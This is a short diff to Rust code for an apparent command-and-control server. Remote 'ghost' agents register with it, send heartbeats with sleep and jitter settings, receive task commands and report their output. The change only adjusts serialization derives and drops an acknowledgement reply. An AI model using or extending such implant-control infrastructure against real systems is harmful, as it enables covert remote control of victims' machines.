@@ -34,27 +34,27 @@ pub struct Task {
     pub result: Option<String>
 }
 
-#[derive(Deserialize)]
+#[derive(Serialize, Deserialize)]
 pub struct HeartbeatRequest {
     pub id: String,
     pub results: Option<Vec<TaskResult>>
 }
 
-#[derive(Deserialize)]
+#[derive(Serialize, Deserialize)]
 pub struct TaskResult {
     pub task_id: String,
     pub status: String,
     pub output: String
 }
 
-#[derive(Serialize)]
+#[derive(Serialize, Deserialize)]
 pub struct HeartbeatResponse {
     pub sleep_interval: i64,
     pub jitter: i64,
     pub tasks: Option<Vec<TaskDefinition>>
 }
 
-#[derive(Serialize)]
+#[derive(Serialize, Deserialize)]
 pub struct TaskDefinition {
     pub id: String,
     pub command: String,
@@ -78,13 +78,11 @@ pub struct ServerState {
 async fn handle_ghost_register(
     State(state): State<Arc<ServerState>>,
     Json(mut ghost): Json<Ghost>
-) -> Json<String> {
+) {
     println!("GHOST registered: {} ({})", ghost.hostname, ghost.id);
 
     ghost.last_seen = chrono::Utc::now().timestamp();
     state.ghosts.insert(ghost.id.clone(), ghost);
-
-    Json("ACK".to_string())
 }
 
 async fn handle_ghost_heartbeat(
